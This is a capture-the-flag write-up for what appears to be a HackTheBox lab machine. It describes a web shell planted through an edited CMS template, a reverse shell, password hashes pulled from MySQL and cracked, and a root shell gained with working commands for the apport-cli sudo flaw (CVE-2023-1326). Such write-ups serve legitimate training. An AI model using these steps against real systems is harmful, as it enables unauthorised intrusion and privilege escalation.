# Port 80

## dev.devvortex.htb

I got access to the admin panel with the credentials obtained

![[admin-panel.png]]

From here try to get a reverse shell from the target machine by editing a template:

![[template-edit-webshell.png]]

Then visit the page:

![[webshell.png]]The webshell is working, now get a reverse shell

![[reverse-shell.png]]


# Target machine

## User flag

Interact with the mysql service using the credentials obtained before

![[mysql.png]]

retrieve usernames and passwords from the users table:

![[username-password-1.png]]

An attempt to crack the password works:

![[cracked.png]]

Try entering the user account:

![[user-flag.png]]
It works now find a PE vector for root.

## Root flag

Basic enumeration of the user logan reveals this:

![[user-interesting.png]]

I found a potential exploit regarding `apport` when the users in `sudoers`

First I got to generate a core dump of any process:

1. In one terminal type: 

```bash
sleep 1000
```

2. In other:
```bash
# get the PID
ps -aux | grep sleep

# Abort the process
kill -ABRT $PID

```

3. Check that a crash file was generated in `/var/crash`

![[crash.png]]

Now follow the steps in the exploit page [here](https://github.com/diego-tella/CVE-2023-1326-PoC):

```bash
sudo /usr/bin/apport-cli -c /var/crash/some_crash_file.crash
press V (view report)
!/bin/bash
```

![[root-shell.png]]

The exploit works, get the root flag!